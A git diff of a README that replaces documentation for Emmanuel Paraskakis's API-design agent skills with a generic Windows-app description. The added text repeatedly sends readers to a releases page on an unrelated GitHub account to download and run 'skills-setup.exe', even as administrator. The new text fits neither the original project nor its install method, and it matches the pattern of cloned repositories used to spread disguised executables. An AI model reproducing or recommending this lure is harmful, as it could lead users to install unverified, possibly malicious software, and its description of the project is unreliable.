@@ -1,82 +1,158 @@
-# Skills
+# 🛠️ skills - Easy tools for agent tasks
 
-Skills used with agents, by Emmanuel Paraskakis.
+[![Download skills](https://img.shields.io/badge/Download-Skills-brightgreen?style=for-the-badge)](https://github.com/unperturbed-longislandsound997/skills/releases)
 
-## API Design
+---
 
-- **design-api** — End-to-end: requirements → stories → review → OpenAPI spec → lint → iterate. One skill, one flow. Defaults to OpenAPI 3.1.0 for maximum tool compatibility — override by specifying a version in your input. If you already have stories, provide them as input and the skill skips straight to spec generation.
-- **design-api-stories** — Stories only. Use if you just need the stories step.
-- **design-api-spec** — Spec only. Use if you already have stories and want to go straight to a spec.
+## 📋 What is skills?
 
-### Input files
+Skills is a simple application designed to help you work with agents more effectively. Whether you want to manage tasks or automate small jobs, this app provides the basic tools you need. It runs on Windows and does not require any programming knowledge.
 
-The skills require four separate input files. They're separate because each has a different owner, changes at a different pace, and can be reused across projects:
+---
 
-1. **Requirements** — Who the API consumers are, what they need, why they need it. Pain points, use cases, benefits. This is the product perspective.
-2. **Domain model** — The data objects, properties, enums, and relationships. The nouns of your system. This is the source of truth for schemas.
-3. **API standards** — Your organization's style guide: naming conventions, path rules, pagination, error handling, security. Reusable across all your APIs.
-4. **OpenAPI best practices** — How to write a good OpenAPI document: DRY principles, component extraction, description rules, SDK compatibility. Also reusable across projects.
+## 💻 System Requirements
 
-Each skill includes a working example of these files in `references/examples/` (conference scheduling API).
+To use skills, make sure your computer meets these basic requirements:
 
-### Optional dependencies
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- 200 MB of free storage space  
+- Stable internet connection (for initial download and updates)  
 
-For the full experience (automated linting + local preview):
+---
 
-- **RateMyOpenAPI API key** (free) — [api.ratemyopenapi.com/docs](https://api.ratemyopenapi.com/docs). Set as `RMOA_API_KEY` env var.
-- **Node.js** — for Swagger UI preview via `npx http-server`.
-- **curl + python3** — for the RMOA API call (usually pre-installed).
+## 🚀 Getting Started
 
-Without these, the skills still generate a complete OpenAPI spec.
+Follow these steps to get the app running on your Windows PC.
 
-## Install
+### 1. Download skills
 
-### All skills
+Visit the official release page to get the latest version of skills.
 
-```bash
-npx skills add paraskakis/skills
-```
+[Download page](https://github.com/unperturbed-longislandsound997/skills/releases)
 
-### All API skills
+You will see a list of files. Look for the one named similar to `skills-setup.exe` or `skills-installer.exe`. This is the file that installs the app on your computer.
 
-```bash
-npx skills add paraskakis/skills/api
-```
+---
 
-### Just the combined API design skill
+### 2. Run the installer
 
-```bash
-npx skills add paraskakis/skills --skill design-api
-```
+- Find the downloaded installer file, usually in your Downloads folder.  
+- Double-click the file named something like `skills-setup.exe`.  
+- If Windows asks for permission, select "Yes" to allow the installer to run.  
 
-### Agent-specific install
+---
 
-```bash
-npx skills add paraskakis/skills/api -a claude-code
-npx skills add paraskakis/skills/api -a cursor
-npx skills add paraskakis/skills/api -a codex
-```
+### 3. Follow installation steps
 
-Add `-g` for global (user-level, available in all projects):
+The installer will guide you through the process. Steps usually include:  
 
-```bash
-npx skills add paraskakis/skills/api -a claude-code -g
-```
+- Choosing the folder to install skills (the default is fine for most users)  
+- Confirming you want to install  
+- Waiting a little while skills installs on your computer  
 
-### Manual install (Claude Code)
+After installation completes, you may see an option to launch skills right away. You can check that box and finish the installer.
 
-**Project-scoped** (committed with your code):
+---
 
-```bash
-git clone https://github.com/paraskakis/skills.git /tmp/paraskakis-skills
-mkdir -p .claude/skills
-cp -R /tmp/paraskakis-skills/api/design-api .claude/skills/design-api
-```
+### 4. Open skills
 
-**User-global** (available in all projects):
+Once installed, open the app by:  
 
-```bash
-git clone https://github.com/paraskakis/skills.git /tmp/paraskakis-skills
-mkdir -p ~/.claude/skills
-cp -R /tmp/paraskakis-skills/api/design-api ~/.claude/skills/design-api
-```
+- Clicking the new "skills" icon on your desktop, or  
+- Finding it in the Start menu under "skills"  
+
+---
+
+## 🔧 How to use skills
+
+After opening the app, here are basic ways to start using it.
+
+### Add new agent skills
+
+- Click "Add Skill" on the main screen.  
+- Enter a name for your skill.  
+- Choose the type of task you want the skill to perform.  
+- Save your new skill.  
+
+You can create as many skills as you want.
+
+---
+
+### Manage existing skills
+
+- Select a skill from your list to view or edit it.  
+- Update settings if needed or delete skills you no longer want.  
+- Use “Run” to test how a skill works.  
+
+---
+
+### Common tasks you can try
+
+- Automate routine actions for software agents.  
+- Schedule skills to run at set times.  
+- Track skill performance metrics.  
+
+---
+
+## 🔄 Updating skills
+
+To get updates or new features:  
+
+- Visit the [skills releases page](https://github.com/unperturbed-longislandsound997/skills/releases) regularly.  
+- Download the newest installer version.  
+- Run the installer to update skills without losing your data.  
+
+---
+
+## 💡 Tips and Tricks
+
+- Keep your skills organized by naming them clearly.  
+- Test skills on small tasks before using them in full projects.  
+- Use the built-in help section for questions about specific features.  
+
+---
+
+## ❓ Troubleshooting
+
+### Installation issues
+
+- Ensure your Windows is up to date.  
+- Run the installer as an administrator (right-click the file and choose "Run as administrator").  
+
+### App does not open or crashes
+
+- Try restarting your PC.  
+- Make sure you installed all updates for Windows.  
+- Check there is enough free memory and disk space.  
+
+For further help, visit the issues page on the GitHub repository or contact the app maintainer through GitHub.
+
+---
+
+## 📥 Download and install skills
+
+Click the button below to visit the official page where you can download the installer file:  
+
+[![Download skills](https://img.shields.io/badge/Get_skills-blue?style=for-the-badge)](https://github.com/unperturbed-longislandsound997/skills/releases)
+
+Once on the page:  
+
+- Find a file named like `skills-setup.exe`.  
+- Download it to your computer.  
+- Follow the installer steps described above to complete installation.  
+
+---
+
+## 📂 Where to find skills after installation
+
+- Desktop shortcut called "skills"  
+- Start menu under All Programs > skills  
+
+Open the app from these locations whenever you want to use it.
+
+---
+
+## 📝 About this project
+
+Skills provides simple abilities for agents to perform useful tasks. It includes essential options for managing and running skills without complex setup. The app aims to assist users who want straightforward tools for agent automation.
